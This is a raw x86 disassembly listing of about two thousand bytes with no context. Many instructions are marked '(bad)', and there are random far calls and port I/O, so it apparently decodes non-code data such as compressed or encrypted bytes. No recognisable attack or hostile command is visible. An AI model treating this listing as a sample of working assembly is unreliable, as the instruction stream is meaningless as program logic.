  413b00:	outs   dx,DWORD PTR ds:[esi]
  413b01:	fsub   QWORD PTR [eax+esi*1-0x1aa10678]
  413b08:	lods   eax,DWORD PTR ds:[esi]
  413b09:	ins    BYTE PTR es:[edi],dx
  413b0a:	int    0x92
  413b0c:	cwde   
  413b0d:	xor    eax,0x239d7d94
  413b12:	mov    dh,0xab
  413b14:	push   0xfefeffd0
  413b19:	inc    ebp
  413b1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b1b:	cdq    
  413b1c:	and    bh,BYTE PTR [esi+0x1a95548d]
  413b22:	loopne 0x413b8b
  413b24:	aas    
  413b25:	adc    al,0x9d
  413b27:	add    BYTE PTR [eax+0x39],al
  413b2a:	aam    0x9d
  413b2c:	jl     0x413acb
  413b2e:	jg     0x413af2
  413b30:	pop    ss
  413b31:	pop    esp
  413b32:	xor    eax,0x640ff012
  413b37:	ror    esp,1
  413b39:	sbb    edi,DWORD PTR [ebx+0x378060]
  413b3f:	pop    ds
  413b40:	mov    dl,0xc6
  413b42:	jg     0x413b21
  413b44:	sbb    edx,eax
  413b46:	ffreep st(6)
  413b48:	jl     0x413b7d
  413b4a:	or     al,0xee
  413b4c:	or     bh,bl
  413b4e:	mov    eax,0x2d136f86
  413b53:	in     al,dx
  413b54:	(bad)  
  413b56:	cdq    
  413b57:	or     DWORD PTR [ecx],ecx
  413b59:	(bad)  
  413b5a:	pushf  
  413b5b:	call   0xc739:0xd25cceaf
  413b62:	imul   esp,DWORD PTR [esi+0x7a125189],0xffffffab
  413b69:	mov    dh,0x88
  413b6b:	pop    edx
  413b6c:	cmp    BYTE PTR [ecx-0x42],bh
  413b6f:	jb     0x413b6c
  413b71:	int3   
  413b72:	sar    DWORD PTR ds:0x26576e17,cl
  413b78:	jmp    0x413ba6
  413b7a:	xchg   ecx,eax
  413b7b:	pop    ds
  413b7c:	scas   al,BYTE PTR es:[edi]
  413b7d:	(bad)  
  413b7e:	in     al,dx
  413b7f:	xchg   edx,eax
  413b80:	pop    ds
  413b81:	and    DWORD PTR [edi+ebp*2+0x1f],esp
  413b85:	push   0x265dd105
  413b8a:	xchg   ebx,eax
  413b8b:	push   eax
  413b8c:	push   ds
  413b8d:	in     eax,dx
  413b8e:	push   0xffffffe9
  413b90:	cmp    bl,BYTE PTR [ebp-0x229dddda]
  413b96:	push   ebp
  413b97:	jno    0x413bee
  413b99:	in     eax,0xda
  413b9b:	sahf   
  413b9c:	mov    bl,0x7d
  413b9e:	popf   
  413b9f:	jb     0x413bbb
  413ba1:	test   DWORD PTR [edx+0x62],0x78e6eb40
  413ba8:	xchg   esi,eax
  413ba9:	jb     0x413c0c
  413bab:	int    0xf6
  413bad:	add    DWORD PTR [esp+eiz*8-0x69663ba8],ebp
  413bb4:	sub    eax,0xfdda31ac
  413bb9:	stos   BYTE PTR es:[edi],al
  413bba:	cmp    bh,0xc8
  413bbd:	xchg   DWORD PTR [ebx+0x74c6b141],esi
  413bc3:	push   0xffffffdd
  413bc5:	sahf   
  413bc6:	imul   eax,DWORD PTR [edi],0xffffffcf
  413bc9:	scas   eax,DWORD PTR es:[edi]
  413bca:	je     0x413c47
  413bcc:	(bad)  
  413bce:	jl     0x413bbd
  413bd0:	nop
  413bd1:	vcvtsd2ss xmm6,xmm3,QWORD PTR [ebp+0x496fe631]
  413bda:	xor    ecx,DWORD PTR [ecx+ecx*1+0x1e]
  413bde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bdf:	imul   edx,DWORD PTR [esi-0x1236bd3f],0xffffffcf
  413be6:	xchg   edi,eax
  413be7:	mov    ah,0xc8
  413be9:	imul   ecx,ecx,0xd44be987
  413bef:	inc    edx
  413bf0:	(bad)  
  413bf1:	cmp    dh,BYTE PTR ds:0x9a5916b1
  413bf7:	sub    bh,bl
  413bf9:	cmp    DWORD PTR [edi-0x74],edi
  413bfc:	ficomp DWORD PTR [esi-0x7b]
  413bff:	xchg   esp,eax
  413c00:	popa   
  413c01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c02:	test   eax,0x9476757f
  413c07:	and    ecx,DWORD PTR [edx+0x650179e1]
  413c0d:	lods   eax,DWORD PTR ds:[esi]
  413c0e:	or     eax,0xeaba8c0b
  413c13:	add    al,0x51
  413c15:	pop    esp
  413c16:	loop   0x413bec
  413c18:	mov    DWORD PTR [ecx-0x2eb29105],ebx
  413c1e:	ins    BYTE PTR es:[edi],dx
  413c1f:	mov    edx,0x6c879b57
  413c24:	rcl    DWORD PTR [esi+0x2ccf8203],0xde
  413c2b:	or     DWORD PTR [edi-0x7ade9d3c],esi
  413c31:	mov    eax,0x73f003af
  413c36:	mov    bh,0x85
  413c38:	nop
  413c39:	test   DWORD PTR [edx],ecx
  413c3b:	into   
  413c3c:	cwde   
  413c3d:	inc    ebx
  413c3e:	(bad)  
  413c3f:	or     eax,0xb6c9a2a9
  413c44:	or     DWORD PTR [edi+0x12233bd8],0x4dd17004
  413c4e:	mov    esp,0x239ab614
  413c53:	mov    esp,0xd60dfa20
  413c58:	push   es
  413c59:	fsubp  st(0),st
  413c5b:	test   al,0x8f
  413c5d:	pop    eax
  413c5e:	test   BYTE PTR [ebx],bl
  413c60:	xor    al,0x5b
  413c62:	add    DWORD PTR [eax],0xffffffa5
  413c65:	stos   BYTE PTR es:[edi],al
  413c66:	inc    ebp
  413c67:	xchg   DWORD PTR [ebp+0x225701d2],esi
  413c6d:	push   ecx
  413c6e:	fisubr DWORD PTR [edi-0x539f03a0]
  413c74:	arpl   WORD PTR [esi+0x18],bx
  413c77:	inc    ecx
  413c78:	sub    eax,0xf0f230bd
  413c7d:	pop    es
  413c7e:	sub    BYTE PTR [ebx+edx*4+0x1f522391],dl
  413c85:	push   0xd4f6675d
  413c8a:	cmp    ebx,0x794546b8
  413c90:	shl    ah,0xbf
  413c93:	or     al,0x10
  413c95:	std    
  413c96:	mul    BYTE PTR [ecx]
  413c98:	loope  0x413d13
  413c9a:	sub    eax,DWORD PTR [eax]
  413c9c:	adc    BYTE PTR [edx+edx*1+0x1d],ch
  413ca0:	xor    eax,DWORD PTR [ebx]
  413ca2:	test   DWORD PTR [esi+0x41],esp
  413ca5:	inc    esi
  413ca6:	jmp    0x5477d8f3
  413cab:	in     al,0x62
  413cad:	jnp    0x413d07
  413caf:	add    DWORD PTR [ebp+ecx*4+0x5b],eax
  413cb3:	or     esp,DWORD PTR [ebx+0x75]
  413cb6:	jb     0x413c38
  413cb8:	mov    ch,bl
  413cba:	call   0x7b93:0x9c2785fb
  413cc1:	arpl   bp,si
  413cc3:	pop    edx
  413cc4:	pop    ebx
  413cc5:	cmp    dh,BYTE PTR [edx+0x16]
  413cc8:	daa    
  413cc9:	xchg   ebp,eax
  413cca:	sub    al,0xe5
  413ccc:	dec    ebx
  413ccd:	sub    bh,bh
  413ccf:	dec    esi
  413cd0:	es dec ecx
  413cd2:	push   edi
  413cd3:	mov    eax,0x41be9a57
  413cd8:	ret    0xccfc
  413cdb:	inc    edx
  413cdc:	fs test al,0xab
  413cdf:	mov    edi,0xdc276aad
  413ce4:	test   DWORD PTR [ebx],0xd6f1aced
  413cea:	gs scas eax,DWORD PTR es:[edi]
  413cec:	dec    ecx
  413ced:	not    ah
  413cef:	fild   DWORD PTR [edi-0x6ad3903]
  413cf5:	call   0x38d2:0x44eef42f
  413cfc:	test   eax,0xb91af0da
  413d01:	fs mov ch,0x80
  413d04:	jecxz  0x413ceb
  413d06:	xor    ebp,DWORD PTR [ecx+0x4f]
  413d09:	(bad)  [eax+ecx*1+0x3723874f]
  413d10:	outs   dx,DWORD PTR ds:[esi]
  413d11:	xchg   ebx,eax
  413d12:	jecxz  0x413cfb
  413d14:	cpuid  
  413d16:	pop    ebp
  413d17:	shl    DWORD PTR [ecx],cl
  413d19:	and    ebp,eax
  413d1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d1c:	mov    edx,0x45f1d059
  413d21:	dec    ebp
  413d22:	mov    cl,0x66
  413d24:	sahf   
  413d25:	in     eax,0x21
  413d27:	cdq    
  413d28:	add    al,0x96
  413d2a:	mov    ch,0x81
  413d2c:	xchg   edi,eax
  413d2d:	or     dh,BYTE PTR [ebx-0x83cc996]
  413d33:	sbb    DWORD PTR [edx],edi
  413d35:	les    edx,FWORD PTR [ecx]
  413d37:	push   ds
  413d38:	mov    dh,BYTE PTR [eax]
  413d3a:	xor    BYTE PTR [esi+0x6cfda413],ah
  413d40:	fdiv   QWORD PTR [esi-0x63]
  413d43:	ret    
  413d44:	and    eax,0x7d3ee382
  413d49:	addr16 add al,0x48
  413d4c:	(bad)  
  413d4d:	rcr    BYTE PTR [eax],cl
  413d4f:	(bad)  
  413d51:	popa   
  413d52:	and    DWORD PTR [edi-0x48f525de],ecx
  413d58:	bound  ebp,QWORD PTR [ebx-0x57]
  413d5b:	jge    0x413d54
  413d5d:	cmp    esp,esp
  413d5f:	and    eax,0xeafe32e8
  413d64:	sahf   
  413d65:	inc    ebp
  413d66:	or     eax,0xd146af5d
  413d6b:	aaa    
  413d6c:	std    
  413d6d:	dec    ebx
  413d6e:	add    eax,0x890e2bd
  413d73:	sbb    edi,esi
  413d75:	push   edi
  413d76:	das    
  413d77:	shl    BYTE PTR [ecx-0x67e3f0bb],0xd4
  413d7e:	jl     0x413ddf
  413d80:	call   0xca29:0x4113c146
  413d87:	or     bh,ch
  413d89:	minps  xmm4,XMMWORD PTR [esp+edi*2+0x19889dcc]
  413d91:	dec    edx
  413d92:	ret    
  413d93:	js     0x413de6
  413d95:	pop    esi
  413d96:	push   0xffffff9f
  413d98:	das    
  413d99:	add    bl,dh
  413d9b:	imul   ebp,DWORD PTR [ebp+0x5526a181],0xffffffb2
  413da2:	retf   
  413da3:	in     al,dx
  413da4:	shl    BYTE PTR [ebx+edi*1-0xfd313d3],cl
  413dab:	je     0x413d9e
  413dad:	mul    BYTE PTR [ebp+0x2330b9a2]
  413db3:	add    eax,0x4f9aee
  413db8:	xchg   ebx,eax
  413db9:	jg     0x413dff
  413dbb:	retf   
  413dbc:	mov    ds:0xecba4b53,eax
  413dc1:	xchg   esp,eax
  413dc2:	es icebp 
  413dc4:	dec    ebx
  413dc5:	push   esp
  413dc6:	sbb    BYTE PTR ds:0xd5914da3,ch
  413dcc:	sbb    edi,DWORD PTR [ebx+ecx*1-0x6edda023]
  413dd3:	cmp    ch,ch
  413dd5:	out    dx,al
  413dd6:	lods   al,BYTE PTR ds:[esi]
  413dd7:	pop    edx
  413dd8:	inc    eax
  413dd9:	sbb    ebp,esi
  413ddb:	into   
  413ddc:	cli    
  413ddd:	cmp    al,0xc1
  413ddf:	xchg   esi,eax
  413de0:	push   0x4b3cf9a1
  413de5:	push   ebp
  413de6:	lahf   
  413de7:	lds    edi,FWORD PTR [eax-0xa]
  413dea:	mov    esi,0x42fc28d4
  413def:	xchg   esi,eax
  413df0:	jecxz  0x413dd7
  413df2:	inc    ebx
  413df3:	idiv   DWORD PTR [esi-0x2d]
  413df6:	(bad)
  413dfa:	into   
  413dfb:	xor    DWORD PTR [esi],ecx
  413dfd:	pop    ecx
  413dfe:	add    bl,BYTE PTR [ebx-0x428a6b80]
  413e04:	cmp    dh,al
  413e06:	sub    eax,0x845fd3dc
  413e0b:	enter  0xb730,0x42
  413e0f:	lods   al,BYTE PTR ds:[esi]
  413e10:	xor    al,0x2d
  413e12:	cmp    DWORD PTR [ebp+0x6036bdfe],ebp
  413e18:	xor    ah,BYTE PTR [ecx+ebp*4+0x39126b62]
  413e1f:	mov    bl,0x68
  413e21:	sbb    al,0xca
  413e23:	sub    BYTE PTR [edi],dl
  413e25:	jb     0x413e28
  413e27:	or     al,0x66
  413e29:	xchg   ebp,esp
  413e2b:	fistp  WORD PTR [esi+ebx*2+0x464dd23]
  413e32:	push   eax
  413e33:	test   eax,0xecff1fe4
  413e38:	sahf   
  413e39:	cmp    esp,DWORD PTR [eax]
  413e3b:	push   esp
  413e3c:	es jo  0x413ea0
  413e3f:	cld    
  413e40:	dec    esp
  413e41:	pop    si
  413e43:	fst    QWORD PTR [edx]
  413e45:	mov    ecx,0xb188043b
  413e4a:	xor    al,0xf1
  413e4c:	mov    dh,0x4b
  413e4e:	sbb    DWORD PTR [edi+edx*4-0x38],ebp
  413e52:	push   edi
  413e53:	data16 test BYTE PTR [edx],0x1d
  413e57:	add    eax,0xa5b0cedf
  413e5c:	push   cs
  413e5d:	mov    cl,0xa0
  413e5f:	push   esp
  413e60:	outs   dx,DWORD PTR ds:[esi]
  413e62:	stos   DWORD PTR es:[edi],eax
  413e63:	imul   eax,DWORD PTR [esi-0x6da403ab],0x9c032d
  413e6d:	dec    DWORD PTR [eax-0x6b43f543]
  413e73:	(bad)  
  413e74:	jb     0x413e0b
  413e76:	mov    eax,ds:0x23da6ea
  413e7b:	popf   
  413e7c:	adc    esp,DWORD PTR cs:[esi]
  413e7f:	push   ecx
  413e80:	imul   ebx,ecx,0xffffffe6
  413e83:	imul   ecx,DWORD PTR [ebp+0x7e6b3f25],0x864b1bde
  413e8d:	inc    ecx
  413e8e:	rol    BYTE PTR [eax-0x11],cl
  413e91:	sbb    ch,BYTE PTR [edx]
  413e93:	mov    dh,0x65
  413e95:	add    al,ch
  413e97:	mov    ecx,0x9e97a25c
  413e9c:	sbb    DWORD PTR [eax],edi
  413e9e:	test   DWORD PTR [ebx+edx*4+0x4763315c],ecx
  413ea5:	repnz fwait
  413ea7:	push   0xf76a882c
  413eac:	sbb    BYTE PTR [eax+0x43],0xdf
  413eb0:	cmp    al,0xf5
  413eb2:	mov    cl,0x75
  413eb4:	mov    eax,ds:0xa31b85f0
  413eb9:	xchg   esp,eax
  413eba:	mov    eax,ds:0xab7814c5
  413ebf:	mov    al,ds:0xad1d976a
  413ec4:	ret    
  413ec5:	cs mov ebx,0x8bcdd123
  413ecb:	and    al,0x5b
  413ecd:	sbb    al,0x2c
  413ed0:	fdivr  QWORD PTR [edi*1-0x4f473747]
  413ed7:	xor    dh,bh
  413ed9:	push   eax
  413eda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413edb:	add    al,0x7c
  413edd:	cli    
  413ede:	jb     0x413ebd
  413ee0:	xchg   esp,eax
  413ee1:	pop    eax
  413ee2:	cmp    dl,0x69
  413ee5:	push   edx
  413ee6:	mov    ds:0x71886d2d,al
  413eeb:	imul   BYTE PTR [edx-0x68]
  413eee:	inc    esp
  413eef:	(bad)  
  413ef0:	or     al,0x2b
  413ef2:	es out dx,eax
  413ef4:	scas   eax,DWORD PTR es:[edi]
  413ef5:	pop    esi
  413ef6:	outs   dx,DWORD PTR ds:[esi]
  413ef7:	pop    DWORD PTR ds:0x32a3724d
  413efd:	sbb    eax,0x4c9878b7
  413f02:	enter  0x5614,0x87
  413f06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f07:	dec    ecx
  413f08:	iret   
  413f09:	xor    eax,0x170a8640
  413f0e:	pop    eax
  413f0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f10:	loop   0x413f62
  413f12:	rcr    BYTE PTR [edx],cl
  413f14:	push   edx
  413f15:	jmp    0x2793:0x30db53ba
  413f1c:	xchg   esi,eax
  413f1d:	jno    0x413eb6
  413f1f:	mov    dh,0xf
  413f21:	je     0x413f68
  413f23:	call   0x5d30:0x8e2a8034
  413f2a:	xor    al,0x44
  413f2c:	mov    dh,BYTE PTR [eax+ebp*8-0x5662238]
  413f33:	push   cs
  413f34:	arpl   WORD PTR [ecx-0xb],cx
  413f37:	sub    BYTE PTR [edx+0x59],ch
  413f3a:	inc    edx
  413f3b:	into   
  413f3c:	mov    ds:0xff167bad,eax
  413f41:	outs   dx,BYTE PTR ds:[esi]
  413f42:	adc    edx,0xffffff9a
  413f45:	mov    dl,0x5d
  413f47:	jecxz  0x413f06
  413f49:	inc    ecx
  413f4a:	sahf   
  413f4b:	jo     0x413f8e
  413f4d:	std    
  413f4e:	or     edx,DWORD PTR [eax]
  413f50:	clc    
  413f51:	ret    
  413f52:	into   
  413f53:	and    ebx,DWORD PTR [eax]
  413f55:	popa   
  413f56:	lahf   
  413f57:	mov    cl,BYTE PTR [ecx]
  413f59:	jne    0x413f41
  413f5b:	in     eax,0xd0
  413f5d:	jno    0x413f1b
  413f5f:	scas   al,BYTE PTR es:[edi]
  413f60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f61:	stos   DWORD PTR es:[edi],eax
  413f62:	ror    DWORD PTR [edi-0x637cefab],cl
  413f68:	pop    ebp
  413f69:	sub    DWORD PTR [ebx-0x76],esp
  413f6c:	and    al,0x2f
  413f6e:	rcr    cl,cl
  413f70:	(bad)  
  413f71:	push   eax
  413f72:	push   edi
  413f73:	mov    edx,0xf740e0d8
  413f78:	add    eax,0x8af1e592
  413f7d:	fbstp  TBYTE PTR [edx+esi*2-0xe]
  413f81:	addr16 sti 
  413f83:	rcl    BYTE PTR [ecx-0x36],0x7f
  413f87:	push   ebp
  413f88:	push   es
  413f89:	dec    edx
  413f8a:	mov    edi,0x6c4566f8
  413f8f:	call   0x7338:0x8e78d2d5
  413f96:	pusha  
  413f97:	sub    eax,0xbf1d4c70
  413f9c:	mov    ebp,0x711bf82f
  413fa1:	cmp    al,0xb9
  413fa3:	dec    ecx
  413fa4:	iret   
  413fa5:	popf   
  413fa6:	push   esi
  413fa7:	int3   
  413fa8:	cmp    al,0x59
  413faa:	jg     0x413f84
  413fac:	pop    es
  413fad:	xchg   edi,eax
  413fae:	jbe    0x413f68
  413fb0:	mov    ah,0x5
  413fb2:	aam    0x7d
  413fb4:	jbe    0x413f48
  413fb6:	(bad)  
  413fb7:	pushf  
  413fb8:	stos   DWORD PTR es:[edi],eax
  413fb9:	arpl   WORD PTR [eax],bp
  413fbb:	lock dec ecx
  413fbd:	add    eax,0x441f1e1f
  413fc2:	jle    0x413f47
  413fc4:	(bad)  
  413fc5:	mov    ch,0xce
  413fc7:	pop    edx
  413fc8:	mov    bl,0x9
  413fca:	mul    BYTE PTR [edi-0x2b]
  413fcd:	and    al,0x4f
  413fcf:	frstor [ecx-0x5f]
  413fd2:	pop    es
  413fd3:	dec    esp
  413fd4:	adc    BYTE PTR [ecx],bl
  413fd6:	dec    ebp
  413fd7:	jo     0x41400b
  413fd9:	pop    ss
  413fda:	frstor [ecx+0x72d06aa2]
  413fe0:	cmp    BYTE PTR [esp+edi*8+0x1b8e1313],bh
  413fe7:	(bad)  
  413fe8:	out    0x4e,eax
  413fea:	addr16 inc esp
  413fec:	outs   dx,BYTE PTR ds:[esi]
  413fed:	xor    DWORD PTR [ebp-0x7e12c82c],eax
  413ff3:	jge    0x414074
  413ff5:	mov    BYTE PTR [eax],0xcb
  413ff8:	fisub  WORD PTR [edi+0x11ee484f]
  413ffe:	fs ja  0x413faf
  414001:	int3   
  414002:	mov    esp,0x48247196
  414007:	call   0xdce293af
  41400c:	test   DWORD PTR [ebp+0x2eb773b1],eax
  414012:	pop    ecx
  414013:	ret    
  414014:	mov    esp,0x77807df1
  414019:	and    eax,0xa2abd04c
  41401e:	ins    BYTE PTR es:[edi],dx
  41401f:	xchg   esp,eax
  414020:	mov    bl,0x7b
  414022:	fcom   DWORD PTR [edi-0x1b]
  414025:	sbb    dh,BYTE PTR [edi+edx*8+0x51]
  414029:	inc    ebp
  41402a:	or     BYTE PTR [ecx+0x15],al
  41402d:	xchg   ebx,eax
  41402e:	in     al,dx
  41402f:	jmp    0x8d22:0x2d1991a0
  414036:	mov    cl,0xbc
  414038:	mov    dl,0xbf
  41403a:	mov    eax,ds:0x567a07fe
  41403f:	cmp    ah,0x81
  414042:	out    0x3,eax
  414044:	lods   al,BYTE PTR ds:[esi]
  414045:	mov    dh,0x2a
  414047:	lock jmp 0x413ff4
  41404a:	cmp    BYTE PTR [ecx-0x749c25],ah
  414050:	inc    eax
  414051:	aad    0x2d
  414053:	add    edi,DWORD PTR [esi+ecx*4]
  414056:	adc    DWORD PTR [edi+0x25],0xdacdf59b
  41405d:	inc    eax
  41405e:	xor    al,0xfc
  414060:	dec    edi
  414061:	cwde   
  414062:	ret    0x6544
  414065:	out    0x51,al
  414067:	lods   eax,DWORD PTR ds:[esi]
  414068:	jp     0x414008
  41406a:	xchg   ebp,eax
  41406b:	popf   
  41406c:	sbb    BYTE PTR [ebx-0x73],bl
  41406f:	sub    al,BYTE PTR [ecx]
  414071:	loopne 0x414007
  414073:	jne    0x4140c5
  414075:	shl    BYTE PTR [ebx+0x7ffb7f57],cl
  41407b:	xor    BYTE PTR [edi-0x1a],ch
  41407e:	popf   
  41407f:	mov    ebp,0x6737aaf9
  414084:	nop
  414085:	fwait
  414086:	jb     0x414027
  414088:	je     0x414094
  41408a:	iret   
  41408b:	hlt    
  41408c:	aam    0xae
  41408e:	push   ebx
  41408f:	sub    ah,BYTE PTR [esi-0xb]
  414092:	dec    edx
  414093:	jmp    0x41410e
  414095:	test   al,0x88
  414097:	pop    di
  414099:	lods   al,BYTE PTR ds:[esi]
  41409a:	add    esp,esi
  41409c:	jecxz  0x4140b1
  41409e:	push   ecx
  41409f:	retf   0xb0c0
  4140a2:	pushf  
  4140a3:	sub    al,BYTE PTR [ebp-0x30ceebea]
  4140a9:	push   edi
  4140aa:	push   ebx
  4140ab:	pop    edx
  4140ac:	fsubr  st,st(4)
  4140ae:	repz pop eax
  4140b0:	adc    esp,DWORD PTR [esi]
  4140b2:	loop   0x414082
  4140b4:	dec    ecx
  4140b5:	int3   
  4140b6:	fld    DWORD PTR [edx+0x23e42d87]
  4140bc:	pushf  
  4140bd:	in     eax,dx
  4140be:	jmp    0x26d7a4a4
  4140c3:	adc    eax,0x1b8be45
  4140c8:	adc    DWORD PTR [ecx+0x33ed09a5],0x1d
  4140cf:	jns    0x414134
  4140d1:	push   eax
  4140d2:	mov    ebp,0x86fb6f0d
  4140d7:	into   
  4140d8:	cmp    ah,BYTE PTR [edi-0x2e55f3ed]
  4140de:	sbb    ch,BYTE PTR fs:[edi+eax*4-0x35b1a224]
  4140e6:	sbb    ebx,DWORD PTR [esi+0x726fe1fa]
  4140ec:	mov    esp,0x39141fc7
  4140f1:	es jnp 0x414154
  4140f4:	lahf   
  4140f5:	loope  0x4140e4
  4140f7:	push   0xffffffb5
  4140f9:	inc    ebx
  4140fa:	hlt    
  4140fb:	into   
  4140fc:	icebp  
  4140fd:	and    dl,BYTE PTR [edx-0x2a0324a0]
  414103:	dec    esi
  414104:	xchg   ecx,eax
  414105:	in     eax,dx
  414106:	test   al,0x22
  414108:	inc    ebx
  414109:	int3   
  41410a:	call   0x4f2b:0x5ed421a2
  414111:	sar    dh,1
  414113:	fcom   QWORD PTR [esi-0x27]
  414116:	mov    bl,0xbf
  414118:	dec    ebp
  414119:	pusha  
  41411a:	pop    ds
  41411b:	dec    esi
  41411c:	int    0x97
  41411e:	call   FWORD PTR [esi+0x9f0cdf1]
  414124:	add    BYTE PTR [eax+0x9],ah
  414127:	ret    0x3f0c
  41412a:	bound  esi,QWORD PTR [eax-0x76]
  41412d:	fild   WORD PTR ds:0xa0aae819
  414133:	retf   0x39cc
  414136:	aas    
  414137:	mov    dl,0xac
  414139:	mov    bl,0xd1
  41413b:	inc    edx
  41413c:	enter  0x2a44,0xbc
  414140:	mov    bh,0x55
  414142:	xchg   ecx,eax
  414143:	cmp    cl,BYTE PTR [ebp-0x4f]
  414146:	adc    DWORD PTR [ecx],eax
  414148:	ja     0x4141b5
  41414a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41414b:	addps  xmm1,XMMWORD PTR [ebp-0x76]
  41414f:	ret    0xaa0
  414152:	aam    0x35
  414154:	pop    edi
  414155:	sub    eax,0xe4d699bf
  41415a:	pop    edx
  41415b:	mov    al,ds:0x8ba6c6bc
  414160:	jae    0x4141ac
  414162:	and    bl,ch
  414164:	mov    ah,dh
  414166:	jg     0x414193
  414168:	cli    
  414169:	mov    eax,ds:0xd378e368
  41416e:	jecxz  0x414118
  414170:	fs jg  0x41418d
  414173:	(bad)  
  414174:	(bad)  
  414175:	mov    al,0x11
  414177:	fcomp  st(2)
  414179:	call   0x8af7:0xd6c1b98
  414180:	and    ah,ah
  414182:	enter  0xf7da,0xaf
  414186:	push   edi
  414187:	pop    eax
  414188:	xlat   BYTE PTR ds:[ebx]
  414189:	or     eax,0xc0d932b7
  41418e:	jecxz  0x4141e8
  414190:	mov    edx,0x32d13855
  414195:	mov    cl,0xa7
  414197:	iret   
  414198:	imul   esp,DWORD PTR [eax],0xc8f9fc35
  41419e:	mov    DWORD PTR [edi],ebx
  4141a0:	lods   eax,DWORD PTR ds:[esi]
  4141a1:	cs add esi,esi
  4141a4:	bound  esp,QWORD PTR [ebp+0x56d0bc15]
  4141aa:	xchg   esp,eax
  4141ab:	mov    dl,0x9a
  4141ad:	push   ebx
  4141ae:	sar    BYTE PTR [eax+0x78],0x84
  4141b2:	jg     0x414166
  4141b4:	imul   esi,DWORD PTR [ebp+0x43c558e7],0xffffffbb
  4141bb:	xchg   ebx,eax
  4141bc:	fwait
  4141bd:	xor    ch,al
  4141bf:	sub    al,0xbc
  4141c1:	adc    cl,BYTE PTR [edx+0x6]
  4141c4:	sub    BYTE PTR [ecx+0x3030628f],0x81
  4141cb:	inc    ebp
  4141cc:	(bad)  
  4141cd:	and    esi,eax
  4141cf:	mov    ecx,DWORD PTR [ebp-0x5f2dd81e]
  4141d5:	jno    0x4141cc
  4141d7:	popf   
  4141d8:	ins    BYTE PTR es:[edi],dx
  4141d9:	xchg   ebx,eax
  4141da:	sbb    BYTE PTR [edx-0x53],cl
  4141dd:	or     eax,0xd170f1b3
  4141e2:	pop    ds
  4141e3:	jne    0x414246
  4141e5:	in     al,0xa
  4141e7:	(bad)  
  4141e8:	outs   dx,DWORD PTR ds:[esi]
  4141e9:	mov    ch,0xec
  4141eb:	mov    esi,0x185b3e48
  4141f0:	jno    0x4141e3
  4141f2:	jmp    0x1546:0x38e44fbf
  4141f9:	pop    eax
  4141fa:	or     dl,BYTE PTR [esi-0x30650cc7]
  414200:	jmp    0xec49a9ba
  414205:	jmp    0x4f94:0xcfcc1a14
  41420c:	in     al,0x6b
  41420e:	mov    esp,0x9d20329f
  414213:	mov    esi,0x136565bf
  414218:	cmc    
  414219:	push   eax
  41421a:	mov    ah,0x60
  41421c:	xlat   BYTE PTR ds:[ebx]
  41421d:	adc    esi,DWORD PTR [eiz*4+0x6a7a7df7]
  414224:	daa    
  414225:	xchg   ecx,eax
  414226:	mov    bh,0x37
  414228:	out    dx,al
  414229:	mov    ebp,DWORD PTR [eax]
  41422b:	mov    al,ds:0x10609962
  414230:	imul   eax,DWORD PTR [eax-0x12],0x2cdea9de
  414237:	jp     0x414218
  414239:	push   ss
  41423a:	in     al,0x65
  41423c:	inc    esp
  41423d:	pop    edi
  41423e:	(bad)  
  41423f:	out    0x69,eax
  414241:	imul   DWORD PTR [ebp-0x3b]
  414244:	or     DWORD PTR [esi+0x7ead984f],edi
  41424a:	xchg   edi,eax
  41424b:	sbb    esp,edi
  41424d:	rcl    dh,0x7f
  414250:	sub    cl,BYTE PTR [ecx+eax*8]
  414253:	(bad)  
  414255:	push   0xb823e387
  41425a:	cmp    eax,0x18c1f74
  41425f:	aam    0x88
  414261:	dec    esi
  414262:	xor    bh,BYTE PTR [edx]
  414264:	shr    DWORD PTR [ecx],cl
  414266:	jmp    0x4141fe
  414268:	fisttp QWORD PTR [esi-0x36]
  41426b:	cmp    esi,ecx
  41426d:	fadd   QWORD PTR [eax]
  41426f:	mov    dh,ch
  414271:	in     al,0x3f
  414273:	xchg   ebx,eax
  414274:	or     BYTE PTR [eax+0x19],al
  414277:	mov    edx,0x78ed3150
  41427c:	xchg   ebp,eax
  41427d:	lods   al,BYTE PTR ds:[esi]
  41427e:	mov    bh,0xf2
  414280:	cmp    eax,0x2ae2f1f7
  414285:	imul   eax,DWORD PTR [edi-0x6d],0xe9948598
  41428c:	xor    eax,0xff7cc244
  414291:	push   ebp
  414292:	mov    esp,0x24aa91a7
  414297:	out    dx,al
  414298:	add    ah,BYTE PTR ds:0xec4f3e32
  41429e:	shl    DWORD PTR [edx-0x7a],0xc7
  4142a2:	into   
  4142a3:	ret    
  4142a4:	and    al,0xf8
  4142a6:	stos   BYTE PTR es:[edi],al
  4142a7:	mov    DWORD PTR ds:0x3138220d,esp
  4142ad:	inc    esp
  4142ae:	add    BYTE PTR [ecx+0xcc9cc6f],bh
  4142b4:	xor    BYTE PTR [edx+edi*2+0x62410ca8],al
  4142bb:	adc    ecx,eax
  4142bd:	mov    esp,0x701a1c17
  4142c2:	push   eax
  4142c3:	mov    edi,0x7a56b536
  4142c8:	repz jmp 0xe895:0xcf69998f
  4142d0:	cmp    eax,0xfeac406f
  4142d5:	dec    esp
  4142d6:	or     al,0x9f
  4142d8:	sub    DWORD PTR [ebx],esp
  4142da:	lahf   
  4142db:	out    0x75,al
  4142dd:	out    dx,eax
  4142de:	int3   
  4142df:	lock pushf 
  4142e1:	pop    esi
  4142e2:	mov    esp,0xbfc6c53e
  4142e7:	stos   DWORD PTR es:[edi],eax
  4142e8:	mov    dl,0x8e
  4142ea:	xor    ecx,esi
  4142ec:	pop    eax
  4142ed:	mov    ds:0x41b1f0b4,al
  4142f2:	inc    edi
  4142f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142f4:	pop    edi
  4142f5:	cld    
  4142f6:	push   eax
  4142f7:	xchg   BYTE PTR [ebp-0x7e7d94e9],cl
  4142fd:	in     al,dx
  4142fe:	jecxz  0x4142ba
  414300:	xchg   esi,eax
  414301:	stc    
  414302:	mov    edx,0x50d7c091
  414307:	shl    edx,1
